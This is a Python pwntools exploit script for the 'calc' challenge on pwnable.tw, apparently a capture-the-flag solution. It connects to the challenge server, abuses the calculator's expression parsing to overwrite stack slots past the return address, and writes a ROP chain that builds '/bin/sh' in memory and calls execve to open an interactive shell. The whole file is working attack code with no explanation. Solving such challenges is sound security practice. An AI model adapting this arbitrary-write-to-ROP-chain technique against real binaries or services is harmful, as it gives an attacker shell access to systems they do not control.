#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('calc')

host = 'chall.pwnable.tw'
port = 10100

def start():
    if args.LOCAL:
        return process(exe.path)
    return remote(host, port)

io = start()
io.recvline()

def write_slot(offset, value):
    m = 0x7fffffff
    p = f'*{offset}'.encode()
    io.sendline(p + b'/' + str(m).encode())
    io.sendline(p + b'/' + str(m).encode())
    io.sendline(p + b'+' + str(value).encode())

ret_off = 362

chain  = p32(0x080701c9)
chain += p32(0x080ebf48)
chain += p32(0x6e69622f)
chain += p32(0x0)
chain += p32(0x080503a8)

chain += p32(0x080701c9)
chain += p32(0x080ebf4c)
chain += p32(0x0068732f)
chain += p32(0x0)
chain += p32(0x080503a8)

chain += p32(0x08058ffc)
chain += p32(0xb)

chain += p32(0x080701d0)
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x080ec000)

chain += p32(0x08070880)

for i in range(0, len(chain), 4):
    write_slot(ret_off + i // 4, u32(chain[i:i+4]))

io.sendline(b'')
io.interactive()
